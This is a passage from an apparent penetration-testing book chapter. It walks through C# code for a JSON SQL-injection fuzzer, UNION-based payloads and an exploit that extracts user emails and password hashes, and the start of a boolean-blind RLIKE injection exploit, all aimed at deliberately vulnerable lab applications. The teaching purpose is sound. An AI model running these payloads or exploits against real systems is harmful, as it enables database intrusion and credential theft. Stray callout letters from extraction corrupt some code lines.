St\",\n\"line2\":\"\",\"city\":\"Arlen\",\"state\":\"TX\",\"zip\":78727,\"first\":\"Hank\",\"middle\":\"\",\"last\":\"Hill\",\n\"method\":\"create\"}\nListing 2-20: Create User request with JSON containing user information to save to the database\n32 Chapter 2\nNow right-click the request pane and select Copy to File. When asked\nwhere to save the HTTP request on your computer, make your choice and\nnote where the request was saved, because you’ll need to pass the path to\nthe fuzzer.\nCreating the JSON Fuzzer\nIn order to fuzz this HTTP request, we need to separate the JSON from the\nrest of the request. We then need to iterate over each key/value pair in the\nJSON and alter the value to try to induce any SQL errors from the web server.\nReading the Request File\nTo create the JSON HTTP request fuzzer, we start with a known-good\nHTTP request (the Create User request). Using the previously saved HTTP\nrequest, we can read in the request and begin the fuzzing process, as shown\nin Listing 2-21.\npublic static void Main(string[] args)\n{\nstring url = uargs[0];\nstring requestFile = vargs[1];\nstring[] request = null;\nusing (StreamReader rdr = wnew StreamReader(File.xOpenRead(requestFile)))\nrequest = rdr.yReadToEnd().zSplit('\\n');\nstring json = {request[request.Length - 1];\nJObject obj = |JObject.Parse(json);\nConsole.WriteLine(\"Fuzzing POST requests to URL \" + url);\n}IterateAndFuzz(url, obj);\n}\nListing 2-21: The Main method, which kicks off fuzzing the JSON parameter\nThe first thing we do is store the first u and second v arguments\npassed to the fuzzer in two variables (url and requestFile, respectively).\nWe also declare a string array that will be assigned the data in our HTTP\nrequest after reading the request from the filesystem.\nWithin the context of a using statement, we open our request file for\nreading using File.OpenRead() x and pass the file stream returned to the\nStreamReader constructor w. With the new StreamReader class instantiated, we\ncan read all the data in the file with the ReadToEnd() method y. We also\nsplit the data in the request file using the Split() method z, passing a\nnewline character to the method as the character to split the request up.\nThe HTTP protocol dictates that newlines (carriage returns and line feeds,\nspecifically) be used to separate the headers from the data being sent in the\nrequest. The string array returned by Split() is assigned to the request vari-\nable we declared earlier.\nHaving read and split the request file, we can grab the JSON data we\nneed to fuzz and begin iterating through the JSON key/value pairs to\nFuzzing and Exploiting XSS and SQL Injection 33\nfind SQL injection vectors. The JSON we want is the last line of the HTTP\nrequest, which is the last element in the request array. Because 0 is the first\nelement in an array, we subtract 1 from the request array length, use the\nresulting integer to grab the last element in the request array, and assign\nthe value to the string json {.\nOnce we have the JSON separated from the HTTP request, we can parse\nthe json string and create a JObject that we can programmatically iterate\non using JObject.Parse() |. The JObject class is available in the Json.NET\nlibrary, freely available via the NuGet package manager or at http://www\n.newtonsoft.com/json/. We will use this library throughout the book.\nAfter creating the new JObject, we print a status line to inform the\nuser we are fuzzing POST requests to the given URL. Finally, we pass the\nJObject and the URL to make HTTP POST requests to the IterateAndFuzz()\nmethod } to process the JSON and fuzz the web application.\nIterating Over the JSON Keys and Values\nNow we can start iterating over each JSON key/value pair and set each pair\nup to test for a possible SQL injection vector. Listing 2-22 shows how to\naccomplish this using the IterateAndFuzz() method.\nprivate static void IterateAndFuzz(string url, JObject obj)\n{\nforeach (var pair in (JObject)uobj.DeepClone())\n{\nif (pair.Value.Type == vJTokenType.String || pair.Value.Type == wJTokenType.Integer)\n{\nConsole.WriteLine(\"Fuzzing key: \" + pair.Key);\nif (pair.Value.Type == JTokenType.Integer)\nxConsole.WriteLine(\"Converting int type to string to fuzz\");\nJToken oldVal = ypair.Value;\nobj[pair.Key] = zpair.Value.ToString() + \"'\";\nif ({Fuzz(url, obj.Root))\nConsole.WriteLine(\"SQL injection vector: \" + pair.Key);\nelse\nConsole.WriteLine (pair.Key + \" does not seem vulnerable.\");\n|obj[pair.Key] = oldVal;\n}\n}\n}\nListing 2-22: The IterateAndFuzz() method, which determines which key/value pairs in the JSON to fuzz\nThe IterateAndFuzz() method starts by looping over the key/value pairs\nin the JObject with a foreach loop. Because we will be altering the values\nwithin the JSON by inserting apostrophes into them, we call DeepClone() u\nso that we get a separate object that is identical to the first. This allows us\n34 Chapter 2\nto iterate over one copy of the JSON key/value pairs while altering another.\n(We need to make a copy because while in a foreach loop, you can’t alter the\nobject you are iterating over.)\nWithin the foreach loop, we test whether the value in the current key/\nvalue pair is a JTokenType.String v or JTokenType.Integer w and continue\nfuzzing that value if the value is either the string or integer type. After\nprinting a message x to alert the user as to which key we are fuzzing, we\ntest whether the value is an integer in order to let the user know that we are\nconverting the value from an integer to a string.\nnote Because integers in JSON have no quotes and must be a whole number or float,\ninserting a value with an apostrophe would cause a parsing exception. Many weakly\ntyped web applications built with Ruby on Rails or Python will not care whether the\nJSON value changes type, but strongly typed web applications built with Java or C#\nmight not behave as expected. The CsharpVulnJson web application does not care\nwhether the type is changed on purpose.\nNext, we store the old value in the oldVal variable y so that we can\nreplace it once we have fuzzed the current key/value pair. After storing the\nold value, we reassign the current value z with the original value, but with\nan apostrophe tacked on the end of the value so that if it is placed in a SQL\nquery, it should cause a parsing exception.\nTo determine whether the altered value will cause an error in the web\napplication, we pass the altered JSON and the URL to send it to the Fuzz()\nmethod { (discussed next), which returns a Boolean value that tells us\nwhether the JSON value could be vulnerable to SQL injection. If Fuzz()\nreturns true, we inform the user that the value may be vulnerable to SQL\ninjection. If Fuzz() returns false, we tell the user that the key does not seem\nvulnerable.\nOnce we have determined whether a value is vulnerable to SQL injec-\ntion, we replace the altered JSON value with the original value | and go on\nto the next key/value pair.\nFuzzing with an HTTP Request\nFinally, we need to make the actual HTTP requests with the tainted JSON\nvalues and read the response back from the server in order to determine\nwhether the value might be injectable. Listing 2-23 shows how the Fuzz()\nmethod creates an HTTP request and tests the response for specific strings to\ndetermine if the JSON value is susceptible to a SQL injection vulnerability.\nprivate static bool Fuzz(string url, JToken obj)\n{\nbyte[] data = System.Text.Encoding.ASCII.uGetBytes(obj.vToString());\nHttpWebRequest req = (HttpWebRequest)wWebRequest.Create(url);\nreq.Method = \"POST\";\nreq.ContentLength = data.Length;\nreq.ContentType = \"application/javascript\";\nFuzzing and Exploiting XSS and SQL Injection 35\nusing (Stream stream = req.xGetRequestStream())\nstream.yWrite(data, 0, data.Length);\ntry\n{\nreq.zGetResponse();\n}\ncatch (WebException e)\n{\nstring resp = string.Empty;\nusing (StreamReader r = new StreamReader(e.Response.{GetResponseStream()))\nresp = r.|ReadToEnd();\nreturn (resp.}Contains(\"syntax error\") || resp.~Contains(\"unterminated\"));\n}\nreturn false;\n}\nListing 2-23: The Fuzz() method, which does the actual communication with the server\nBecause we need to send the whole JSON string as bytes, we pass the\nstring version of our JObject returned by ToString() v to the GetBytes() u\nmethod, which returns a byte array representing the JSON string. We also\nbuild the initial HTTP request to be made by calling the static Create()\nmethod w from the WebRequest class to create a new WebRequest, casting the\nresulting object to an HttpWebRequest class. Next, we assign the HTTP method,\nthe content length, and the content type of the request. We assign the Method\nproperty a value of POST because the default is GET, and we assign the length\nof our byte array that we will be sending to the ContentLength property. Finally,\nwe assign application/javascript to the ContentType to ensure the web server\nknows that the data it is receiving should be well-formed JSON.\nNow we write our JSON data to the request stream. We call the\nGetRequestStream() method x and assign the stream returned to a variable\nin the context of a using statement so that our stream is disposed of properly\nafter use. We then call the stream’s Write() method y, which takes three\narguments: the byte array containing our JSON data, the index of the array\nwe want to begin writing from, and the number of bytes we want to write.\n(Because we want to write all of them, we pass in the entire length of the\ndata array.)\nTo get the response back from the server, we create a try block so\nthat we can catch any exceptions and retrieve their responses. We call\nGetResponse() z within the try block to attempt to retrieve a response from\nthe server, but we only care about responses with HTTP return codes of 500\nor higher, which would cause GetResponse() to throw an exception.\nIn order to catch these responses, we follow the try block with a catch\nblock in which we call GetResponseStream() { and create a new StreamReader\nfrom the stream returned. Using the stream’s ReadToEnd() method |, we\nstore the server’s response in the string variable resp (declared before the\ntry block started).\n36 Chapter 2\nTo determine whether the value sent may have caused a SQL error, we\ntest the response for one of two known strings that appear in SQL errors.\nThe first string, \"syntax error\" }, is a general string that is present in the\nMySQL error, as shown in Listing 2-24.\nERROR: 42601: syntax error at or near &quot;dsa&quot;\nListing 2-24: Sample MySQL error message containing syntax error\nThe second string, \"unterminated\" ~, appears in a specific MySQL error\nwhen a string is not terminated, as in Listing 2-25.\nERROR: 42601: unterminated quoted string at or near \"'); \"\nListing 2-25: Sample MySQL error message containing unterminated\nThe appearance of either error message could mean a SQL injection\nvulnerability exists within an application. If the response from an error\nreturned contains either string, we return a value of true to the calling\nmethod, which means we think the application is vulnerable. Otherwise,\nwe return false.\nTesting the JSON Fuzzer\nHaving completed the three methods required to fuzz the HTTP JSON\nrequest, we can test the Create User HTTP request, as shown in Listing 2-26.\n$ fuzzer.exe http://192.168.1.56/Vulnerable.ashx /Users/bperry/req_vulnjson\nFuzzing POST requests to URL http://192.168.1.13/Vulnerable.ashx\nFuzzing key: username\nSQL injection vector: username\nFuzzing key: password\nSQL injection vector: password\nFuzzing key: ageu\nConverting int type to string to fuzz\nSQL injection vector: age\nFuzzing key: line1\nSQL injection vector: line1\nFuzzing key: line2\nSQL injection vector: line2\nFuzzing key: city\nSQL injection vector: city\nFuzzing key: state\nSQL injection vector: state\nFuzzing key: zipv\nConverting int type to string to fuzz\nSQL injection vector: zip\nFuzzing key: first\nfirst does not seem vulnerable.\nFuzzing key: middle\nmiddle does not seem vulnerable.\nFuzzing key: last\nlast does not seem vulnerable.\nFuzzing and Exploiting XSS and SQL Injection 37\nFuzzing key: methodw\nmethod does not seem vulnerable.\nListing 2-26: The output from running the JSON fuzzer against the CsharpVulnJson\napplication\nRunning the fuzzer on the Create User request should show that most\nparameters are vulnerable to a SQL injection attack (the lines beginning\nwith SQL injection vector), except for the method JSON key w used by the web\napplication to determine which operation to complete. Notice that even the\nage u and zip v parameters, originally integers in the JSON, are vulnerable\nif they are converted to a string when tested.\nexploiting SQL injections\nFinding possible SQL injections is only half the job of a penetration tes-\nter; exploiting them is the more important and more difficult half. Earlier\nin the chapter, we used a URL from BadStore to fuzz HTTP query string\nparameters, one of which was a vulnerable query string parameter called\nsearchquery (refer back to Listing 2-13 on page 25). The URL query string\nparameter searchquery is vulnerable to two types of SQL injection tech-\nniques. Both injection types (boolean based and UNION based) are incredibly\nuseful to understand, so I’ll describe writing exploits for both types using\nthe same vulnerable BadStore URL.\nThe UNION technique is the easier one to use when exploiting SQL injec-\ntions. It’s possible to use a UNION in SELECT query injections when you’re able\nto control the end of the SQL query. An attacker who can append a UNION\nstatement to the end of a SELECT statement can return more rows of data to\nthe web application than originally intended by the programmer.\nOne of the trickiest parts of figuring out a UNION injection lies in balanc-\ning the columns. In essence, you must balance the same number of columns\nwith the UNION clause as the original SELECT statement returns from the data-\nbase. Another challenge lies in being able to programmatically tell where\nyour injected results appear in the response from the web server.\nPerforming a UNION-Based Exploit by Hand\nUsing UNION-based SQL injections is the fastest way to retrieve data from a\ndatabase. In order to retrieve attacker-controlled data from the database\nwith this technique, we must build a payload that retrieves the same num-\nber of columns as the original SQL query in the web application. Once we\ncan balance the columns, we need to be able to programmatically find the\ndata from the database in the HTTP response.\nWhen an attempt is made to balance the columns in a UNION-injectable\nSQL injection and the columns don’t balance, the error generally returned\nby the web application using MySQL is similar to that shown in Listing 2-27.\n38 Chapter 2\nThe used SELECT statements have a different number of columns...\nListing 2-27: Sample MySQL error when SELECT queries on the left and right of UNION\naren’t balanced\nLet’s take the vulnerable line of code in the BadStore web applica-\ntion (badstore.cgi, line 203) and see how many columns it is selecting (see\nListing 2-28).\n$sql=\"SELECT itemnum, sdesc, ldesc, price FROM itemdb WHERE '$squery' IN (itemnum,sdesc,ldesc)\";\nListing 2-28: Vulnerable line in the BadStore web application selecting four columns\nBalancing SELECT statements takes a bit of testing, but I know from read-\ning the source code of BadStore that this particular SELECT query returns\nfour columns. When passing in the payload with spaces that are URL-\nencoded as plus signs, as shown in Listing 2-29, we find the word hacked\nreturned as a row in the search results.\nsearchquery=fdas'+UNION+ALL+SELECT+NULL, NULL, 'hacked', NULL%23\nListing 2-29: Properly balanced SQL injection that brings the word hacked back from the\ndatabase\nWhen the searchquery value in this payload is passed to the application,\nthe searchquery variable is used directly in the SQL query sent to the data-\nbase, and we turn the original SQL query (Listing 2-28) into a new SQL\nquery not intended by the original programmer, as shown in Listing 2-30.\nSELECT itemnum, sdesc, ldesc, price FROM itemdb WHERE 'fdas' UNION ALL SELECT\nNULL, NULL, 'hacked', NULLu# ' IN (itemnum,sdesc,ldesc)\nListing 2-30: Full SQL query with the payload appended that returns the word hacked\nWe use a hash mark u to truncate the original SQL query, turning\nany SQL code following our payload into a comment that will not be run\nby MySQL. Now, any extra data (the word hacked in this case) that we want\nreturned in the web server’s response should be in the third column of\nthe UNION.\nHumans can determine fairly easily where the data returned by the\npayload shows up in the web page after exploitation. A computer, how-\never, needs to be told where to look for any data brought back from a SQL\ninjection exploit. It can be difficult to programmatically detect where the\nattacker-controlled data is in the server response. To make this easier, we\ncan use the CONCAT SQL function to surround the data we actually care\nabout with known markers, as in Listing 2-31.\nsearchquery=fdsa'+UNION+ALL+SELECT+NULL, NULL, CONCAT(0x71766a7a71,'hacked',0x716b626b71), NULL#\nListing 2-31: Sample payload for the searchquery parameter that returns the word hacked\nFuzzing and Exploiting XSS and SQL Injection 39\nThe payload in Listing 2-31 uses hexadecimal values to add data to\nthe left and right of the extra value hacked we select with our payload. If the\npayload is echoed back in the HTML from the web application, a regular\nexpression won’t accidentally match the original payload. In this example,\n0x71766a7a71 is qvjzq and 0x716b626b71 is qkbkq. If the injection works, the\nresponse should contain qvjzqhackedqkbkq. If the injection doesn’t work,\nand the search results are echoed back as is, a regular expression such\nas qvjzq(.*)qkbkq would not match the hexadecimal values in the original\npayload. The MySQL CONCAT() function is a handy way to ensure that our\nexploit will grab the correct data from the web server response.\nListing 2-32 shows a more useful example. Here, we can replace the\nCONCAT() function from the previous payload to return the current database,\nsurrounded by the known left and right markers.\nCONCAT(0x7176627a71, DATABASE(), 0x71766b7671)\nListing 2-32: Sample payload that returns the current database name\nThe result of the injection on the BadStore search function should\nbe qvbzqbadstoredbqvkvq. A regular expression such as qvbzq(.*)qvkvq should\nreturn the value of badstoredb, the name of the current database.\nNow that we know how to efficiently get the values out of the data-\nbase, we can begin siphoning data out of the current database using the\nUNION injection. One particularly useful table in most web applications is\nthe users table. As you can see in Listing 2-33, we can easily use the UNION\ninjection technique described earlier to enumerate the users and their\npassword hashes from the users table (called userdb) with a single request\nand payload.\nsearchquery=fdas'+UNION+ALL+SELECT+NULL, NULL, CONCAT(0x716b717671, email,\n0x776872786573, passwd,0x71767a7a71), NULL+FROM+badstoredb.userdb#\nListing 2-33: This payload pulls the emails and passwords from the BadStore database\nseparated by left, middle, and right markers.\nThe results should show up on the web page in the item table if the\ninjection is successful.\nPerforming a UNION-Based Exploit Programmatically\nNow let’s look at how we can perform this exploit programmatically using\nsome C# and the HTTP classes. By putting the payload shown in Listing 2-33\nin the searchquery parameter, we should see an item table in the web page\nwith usernames and password hashes instead of any real items. All we need\nto do is make a single HTTP request and then use a regular expression to\npull the emails and password hashes between the markers from the HTTP\nserver’s response.\n40 Chapter 2\nCreating the Markers to Find the Usernames and Passwords\nFirst, we need to create the markers for the regular expression, as shown\nin Listing 2-34. These markers will be used to delineate the values brought\nback from the database during the SQL injection. We want to use random-\nlooking strings not likely to be found in the HTML source code so that our\nregular expression will only grab the usernames and password hashes we\nwant from the HTML returned in the HTTP response.\nstring frontMarker = u\"FrOnTMaRker\";\nstring middleMarker = v\"mIdDlEMaRker\";\nstring endMarker = w\"eNdMaRker\";\nstring frontHex = string.xJoin(\"\", frontMarker.ySelect(c => ((int)c).ToString(\"X2\")));\nstring middleHex = string.Join(\"\", middleMarker.Select(c => ((int)c).ToString(\"X2\")));\nstring endHex = string.Join(\"\", endMarker.Select(c => ((int)c).ToString(\"X2\")));\nListing 2-34: Creating the markers to be used in the UNION-based SQL injection payload\nTo start things off, we create three strings to be used as the front u,\nmiddle v, and end w markers. These will be used to find and separate\nthe usernames and passwords we pulled from the database in the HTTP\nresponse. We also need to create the hexadecimal representations of the\nmarkers that will go in the payload. To do this, each marker needs to be\nprocessed a little bit.\nWe use the LINQ method Select() y to iterate over each character in\nthe marker string, convert each character into its hexadecimal representa-\ntion, and return an array of the data processed. In this case, it returns an\narray of 2-byte strings, each of which is the hexadecimal representation of\na character in the original marker.\nIn order to create a full hexadecimal string from this array, we use the\nJoin() method x to join each element in the array, creating a hexadecimal\nstring representing each marker.\nBuilding the URL with the Payload\nNow we need to build the URL and the payload to make the HTTP request,\nas shown in Listing 2-35.\nstring url = u\"http://\" + vargs[0] + \"/cgi-bin/badstore.cgi\";\nstring payload = \"fdsa' UNION ALL SELECT\";\npayload += \" NULL, NULL, NULL, CONCAT(0x\"+frontHex+\", IFNULL(CAST(email AS\";\npayload += \" CHAR), 0x20),0x\"+middleHex+\", IFNULL(CAST(passwd AS\";\npayload += \" CHAR), 0x20), 0x\"+endHex+\") FROM badstoredb.userdb# \";\nurl += w\"?searchquery=\" + Uri.xEscapeUriString(payload) + \"&action=search\";\nListing 2-35: Building the URL with the payload in the Main() method of the exploit\nFuzzing and Exploiting XSS and SQL Injection 41\nWe create the URL u to make the request using the first argument v\npassed to the exploit: an IP address of the BadStore instance. Once the base\nURL is created, we create the payload to be used to return the usernames\nand password hashes from the database, including the three hexadecimal\nstrings we made of the markers to separate the usernames from the pass-\nwords. As stated earlier, we encode the markers in hexadecimal to ensure\nthat, in case the markers are echoed back without the data we want, our regu-\nlar expression won’t accidentally match them and return junk data. Finally,\nwe combine the payload and the URL w by appending the vulnerable query\nstring parameters with the payload on the base URL. To ensure that the pay-\nload doesn’t contain any characters unique to the HTTP protocol, we pass\nthe payload to EscapeUriString() x before inserting it into the query string.\nMaking the HTTP Request\nWe are now ready to make the request and receive the HTTP response con-\ntaining the usernames and password hashes that were pulled from the data-\nbase with the SQL injection payload (see Listing 2-36).\nHttpWebRequest request = (HttpWebRequest)WebRequest.uCreate(url);\nstring response = string.Empty;\nusing (StreamReader reader = vnew StreamReader(request.GetResponse().GetResponseStream()))\nresponse = reader.wReadToEnd();\nListing 2-36: Creating the HTTP request and reading the response from the server\nWe create a basic GET request by creating a new HttpWebRequest u\nwith the URL we built previously containing the SQL injection payload.\nWe then declare a string to hold our response, assigning it an empty\nstring by default. Within the context of a using statement, we instantiate a\nStreamReader v and read the response w into our response string. Now that\nwe have the response from the server, we can create a regular expression\nusing our markers to find the usernames and passwords within the HTTP\nresponse, as Listing 2-37 shows.\nRegex payloadRegex = unew Regex(frontMarker + \"(.*?)\" + middleMarker + \"(.*?)\" + endMarker);\nMatchCollection matches = payloadRegex.vMatches(response);\nforeach (Match match in matches)\n{\nConsole.wWriteLine(\"Username: \" + match.xGroups [1].Value + \"\\t \");\nConsole.Write(\"Password hash: \" + match.yGroups[2].Value);\n}\n}\nListing 2-37: Matching the server response against the regular expression to pull out database values\nHere, we find and print the values retrieved with the SQL injection\nfrom the HTTP response. We first use the Regex class u (in the namespace\nSystem.Text.RegularExpressions) to create a regular expression. This regular\nexpression contains two expression groups that capture the username and\n42 Chapter 2\npassword hash from a match, using the front, middle, and end markers\ndefined previously. We then call the Matches() method v on the regular\nexpression, passing the response data as an argument to Matches(). The\nMatches() method returns a MatchCollection object, which we can iterate\nover using a foreach loop to retrieve each string in the response that\nmatches the regular expression created earlier using our markers.\nAs we iterate over each expression match, we print the username and\npassword hash. Using the WriteLine() method w to print the values, we build\na string using the expression group captures for the usernames x and the\npasswords y, which are stored the Groups property of the expression match.\nRunning the exploit should result in the printout shown in Listing 2-38.\nUsername: AAA_Test_User Password hash: 098F6BCD4621D373CADE4E832627B4F6\nUsername: admin Password hash: 5EBE2294ECD0E0F08EAB7690D2A6EE69\nUsername: joe@supplier.com Password hash: 62072d95acb588c7ee9d6fa0c6c85155\nUsername: big@spender.com Password hash: 9726255eec083aa56dc0449a21b33190\n--snip--\nUsername: tommy@customer.net Password hash: 7f43c1e438dc11a93d19616549d4b701\nListing 2-38: Sample output from the UNION-based exploit\nAs you can see, with a single request we were able to extract all the user-\nnames and password hashes from the userdb table in the BadStore MySQL\ndatabase using a UNION SQL injection.\nExploiting Boolean-Blind SQL Vulnerabilities\nA blind SQL injection, also known as a Boolean-based blind SQL injection, is one\nin which an attacker doesn’t get direct information from a database but can\nextract information indirectly from the database, generally 1 byte at a time,\nby asking true-or-false questions.\nHow Blind SQL Injections Work\nBlind SQL injections require a bit more code than UNION exploits in order\nto efficiently exploit a SQL injection vulnerability, and they take much\nmore time to complete because so many HTTP requests are required. They\nare also far noisier on the server’s side than something like the UNION exploit\nand may leave much more evidence in logs.\nWhen performing a blind SQL injection, you get no direct feedback\nfrom the web application; you rely instead on metadata, such as behavior\nchanges, in order to glean information from a database. For instance, by\nusing the RLIKE MySQL keyword to match values in the database with a reg-\nular expression, as shown in Listing 2-39, we can cause an error to display\nin BadStore.\nsearchquery=fdsa'+RLIKE+0x28+AND+'\nListing 2-39: Sample RLIKE blind SQL injection payload that causes an error in BadStore\nFuzzing and Exploiting XSS and SQL Injection 43\nWhen passed to BadStore, RLIKE will attempt to parse the hexadecimal-\nencoded string as a regular expression, causing an error (see Listing 2-40)\nbecause the string passed is a special character in regular expressions. The\nopen parenthesis [ ( ] character (0x28 in hexadecimal) denotes the begin-\nning of an expression group, which we also used to match usernames and\npassword hashes in the UNION exploit. The open parenthesis character must\nhave a corresponding close parenthesis [ ) ] character; otherwise, the syn-\ntax for the regular expression will be invalid.\nGot error 'parentheses not balanced' from regexp\nListing 2-40: Error from RLIKE when an invalid regular expression is passed in\nThe parentheses are not balanced because a close parenthesis is miss-\ning. Now we know that we can reliably control the behavior of BadStore\nusing true and false SQL queries to cause it to error.\nUsing RLIKE to Create True and False Responses\nWe can use a CASE statement in MySQL (which behaves like a case state-\nment in C-like languages) to deterministically select a good or bad regu-\nlar expression for RLIKE to parse. For example, Listing 2-41 returns a true\nresponse.\nsearchquery=fdsa'+RLIKE+(SELECT+(CASE+WHEN+(1=1u)+THEN+0x28+ELSE+0x41+END))+AND+'\nListing 2-41: An RLIKE blind payload that should return a true response\nThe CASE statement first determines whether 1=1 u is true. Because this\nequation is true, 0x28 is returned as the regular expression that RLIKE will\ntry to parse, but because ( is not a valid regular expression, an error should\nbe thrown by the web application. If we manipulate the CASE criteria of 1=1\n(which evaluates to true) to be 1=2, the web application no longer throws an\nerror. Because 1=2 evaluates to false, 0x41 (an uppercase A in hexadecimal)\nis returned to be parsed by RLIKE and does not cause a parsing error.\nBy asking true-or-false questions (does this equal that?) of the web appli-\ncation, we can determine how it behaves and then, based on that behavior,\ndetermine whether the answer to our question was true or false.\nUsing the RLIKE Keyword to Match Search Criteria\nThe payload in Listing 2-42 for the searchquery parameter should return a\ntrue response (an error) because the length of the number of rows in the\nuserdb table is greater than 1.\nsearchquery=fdsa'+RLIKE+(SELECT+(CASE+WHEN+((SELECT+LENGTH(IFNULL(CAST(COUNT(*)\n+AS+CHAR),0x20))+FROM+userdb)=1u)+THEN+0x41+ELSE+0x28+END))+AND+'\nListing 2-42: Sample Boolean-based SQL injection payload for the searchquery parameter\n44 Chapter 2\nUsing the RLIKE and CASE statements, we check whether the length of the\ncount of the BadStore userdb is equal to 1. The COUNT(*) statement returns an\ninteger, which is the number of rows in a table. We can use this number to\nsignificantly reduce the number of requests needed to finish an attack.\nIf we modify the payload to determine whether the length of the num-\nber of rows is equal to 2 instead of 1 u, the server should return a true\nresponse that contains an error that says “parentheses not balanced.” For\nexample, say BadStore has 999 users in the userdb table. Although you might\nexpect that we’d need to send at least 1,000 requests to determine whether\nthe number returned by COUNT(*) was greater than 999, we can brute-force\neach individual digit (each instance of 9) much faster than we could the\nwhole number (999). The length of the number 999 is three, since 999 is\nthree characters long. If, instead of brute-forcing the whole number 999,\nwe brute-force the first, second, and then third digits individually, we would\nhave the whole number 999 brute-forced in just 30 requests—up to 10\nrequests per single number.\nDetermining and Printing the Number of Rows in the userdb Table\nTo make this a bit more clear, let’s write a Main() method to determine how\nmany rows are contained in the userdb table. With the for loop shown in\nListing 2-43, we determine the length of the number of rows contained in\nthe userdb table.\nint countLength = 1;\nfor (;;countLength++)\n{\nstring getCountLength = \"fdsa' RLIKE (SELECT (CASE WHEN ((SELECT\";\ngetCountLength += \" LENGTH(IFNULL(CAST(COUNT(*) AS CHAR),0x20)) FROM\";\ngetCountLength += \" userdb)=\"+countLength+\") THEN 0x28 ELSE 0x41 END))\";\ngetCountLength += \" AND 'LeSo'='LeSo\";\nstring response = MakeRequest(getCountLength);\nif (response.Contains(\"parentheses not balanced\"))\nbreak;\n}\nListing 2-43: The for loop retrieving the length of the database count of the user database\nWe begin with a countLength of zero and then increment countLength by 1\neach time through the loop, checking whether the response to the request\ncontains the true string \"parentheses not balanced\". If so, we break out of the\nfor loop with the correct countLength, which should be 23.\nThen we ask the server for the number of rows contained in the userdb\ntable, as shown in Listing 2-44.\nList<byte> countBytes = new List<byte>();\nfor (int i = 1; i <= countLength; i++)\n{\nfor (int c = 48; c <= 58; c++)\n{\nFuzzing and Exploiting XSS and SQL Injection 45\nstring getCount = \"fdsa' RLIKE (SELECT (CASE WHEN (uORD(vMID((SELECT\";\ngetCount += \" IFNULL(CAST(COUNT(*) AS CHAR), 0x20) FROM userdb)w,\";\ngetCount += ix+ \", 1y))=\"+cz+\") THEN 0x28 ELSE 0x41 END)) AND '\";\nstring response = MakeRequest (getCount);\nif (response.{Contains(\"parentheses not balanced\"))\n{\ncountBytes.|Add((byte)c);\nbreak;\n}\n}\n}\nListing 2-44: Retrieving the number of rows in the userdb table\nThe SQL payload used in Listing 2-44 is a bit different from the pre-\nvious SQL payloads used to retrieve the count. We use the ORD() u and\nMID() v SQL functions.\nThe ORD() function converts a given input into an integer, and the MID()\nfunction returns a particular substring, based on a starting index and length\nto return. By using both functions, we can select one character at a time\nfrom a string returned by a SELECT statement and convert it to an integer.\nThis allows us to compare the integer representation of the byte in the\nstring to to the character value we are testing for in the current interation.\nThe MID() function takes three arguments: the string you are select-\ning a substring from w; the starting index (which is 1 based, not 0 based,\nas you might expect) x; and the length of the substring to select y. Notice\nthat the second argument x to MID() is dictated by the current iteration of\nthe outermost for loop, where we increment i up to the count length deter-\nmined in the previous for loop. This argument selects the next character in\nthe string to test as we iterate and increment it. The inner for loop iterates\nover the integer equivalents of the ASCII characters 0 through 9. Because\nwe’re only attempting to get the row count in the database, we only care\nabout numerical characters.\nBoth the i x and c z variables are used in the SQL payload during the\nBoolean injection attack. The variable i is used as the second argument in\nthe MID() function, dictating the character position in the database value we\nwill test. The variable c is the integer we are comparing the result of ORD()\nto, which converts the character returned by MID() to an integer. This allows\nus to iterate over each character in a given value in the database and brute-\nforce the character using true-or-false questions.\nWhen the payload returns the error \"parentheses not balanced\" {, we\nknow that the character at index i equals the integer c of the inner loop.\nWe then cast c to a byte and add it to a List<byte> | instantiated before\nlooping. Finally, we break out of the inner loop to iterate through the outer\nloop and, once the for loops have completed, we convert the List<byte> into\na printable string.\nThis string is then printed to the screen, as shown in Listing 2-45.\n46 Chapter 2\nint count = int.Parse(Encoding.ASCII.uGetString(countBytes.ToArray()));\nConsole.WriteLine(\"There are \"+count+\" rows in the userdb table\");\nListing 2-45: Converting the string retrieved by the SQL injection and printing the number\nof rows in the table\nWe use the GetString() method u (from the Encoding.ASCII class) to\nconvert the array of bytes returned by countBytes.ToArray() into a human-\nreadable string. This string is then passed to int.Parse(), which parses it\nand returns an integer (if the string can be converted to an integer). The\nstring is then printed using Console.WriteLine().\nThe MakeRequest() Method\nWe’re just about ready to run our exploit, save for one more thing: we need\na way to send payloads within the for loops. To do so, we need to write the\nMakeRequest() method, which takes a single argument: the payload to send\n(see Listing 2-46).\nprivate static string MakeRequest(string payload)\n{\nstring url = u\"http://192.168.1.78/cgi-bin/badstore.cgi?action=search&searchquery=\";\nHttpWebRequest request = (HttpWebRequest)WebRequest.vCreate(url+payload);\nstring response = string.Empty;\nusing (StreamReader reader = new wStreamReader(request.GetResponse().GetResponseStream()))\nresponse = reader.ReadToEnd();\nreturn response;\n}\nListing 2-46: The MakeRequest() method sending the payload and returning the server’s response\nWe create a basic GET HttpWebRequest v using the payload and URL u to\nthe BadStore instance. Then, using a StreamReader w, we read the response\ninto a string and return the response to the caller. Now we run the exploit\nand should receive something like the output shown in Listing 2-47.\nThere are 23 rows in the userdb table\nListing 2-47: Determining the number of rows in the userdb table\nAfter running the first piece of our exploit, we see we have 23 users\nto pull usernames and password hashes for. The next piece of the exploit\nwill pull out the actual usernames and password hashes.\nRetrieving the Lengths of the Values\nBefore we can pull any values from the columns in the database, byte by\nbyte, we need to get the lengths of the values. Listing 2-48 shows how this\ncan be done.\nFuzzing and Exploiting XSS and SQL Injection 47\nprivate static int GetLength(int rowu, string columnv)\n{\nint countLength = 0;\nfor (;; countLength++)\n{\nstring getCountLength = \"fdsa' RLIKE (SELECT (CASE WHEN ((SELECT\";\ngetCountLength += \" LENGTH(IFNULL(CAST(wCHAR_LENGTH(\"+column+\") AS\";\ngetCountLength += \" CHAR),0x20)) FROM userdb ORDER BY email xLIMIT\";\ngetCountLength += row+\",1)=\"+countLength+\") THEN 0x28 ELSE 0x41 END)) AND\";\ngetCountLength += \" 'YIye'='YIye\";\nstring response = MakeRequest(getCountLength);\nif (response.Contains(\"parentheses not balanced\"))\nbreak;\n}\nListing 2-48: Retrieving the length of certain values in the database\nThe GetLength() method takes two arguments: the database row to pull\nthe value from u and the database column in which the value will reside v.\nWe use a for loop (see Listing 2-49) to gather the length of the rows in the\nuserdb table. But unlike in the previous SQL payloads, we use the function\nCHAR_LENGTH() w instead of LENGTH because the strings being pulled could be\n16-bit Unicode instead of 8-bit ASCII. We also use a LIMIT clause x to specify\nthat we want to pull the value from a specific row returned from the full\nusers table. After retrieving the length of the value in the database, we can\nretrieve the actual value a byte at a time, as shown in Listing 2-49.\nList<byte> countBytes = 